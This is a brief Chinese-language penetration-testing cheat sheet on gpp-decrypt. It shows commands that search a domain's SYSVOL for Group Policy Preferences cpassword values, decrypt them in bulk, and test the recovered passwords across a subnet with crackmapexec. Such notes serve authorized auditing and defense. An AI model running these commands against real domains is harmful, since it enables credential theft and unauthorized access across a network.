# gpp-decrypt 使用

gpp-decrypt 用来解密老域环境 Group Policy Preferences 中的 cpassword。现在新系统很少主动生成，但历史 SYSVOL 里仍可能残留。

## 查找 cpassword

```bash
grep -R "cpassword" -n /mnt/sysvol
```

```bash
find /mnt/sysvol -iname "*.xml" -type f -print
```

```bash
smbclient //dc01/SYSVOL -U 'domain/user%pass' -c 'recurse; ls'
```

## 解密

```bash
gpp-decrypt 'cpassword_value_here'
```

```bash
python3 gpp-decrypt.py 'cpassword_value_here'
```

```bash
grep -Rho 'cpassword="[^"]*"' /mnt/sysvol | cut -d'"' -f2 | while read c; do gpp-decrypt "$c"; done
```

## 结果验证

```bash
crackmapexec smb 192.168.1.0/24 -u user -p 'decrypted_password'
```

小记录：GPP 命中后要记录 XML 路径、关联账号和策略名称。很多环境里密码已经轮换，仍然能暴露命名习惯和历史权限设计。
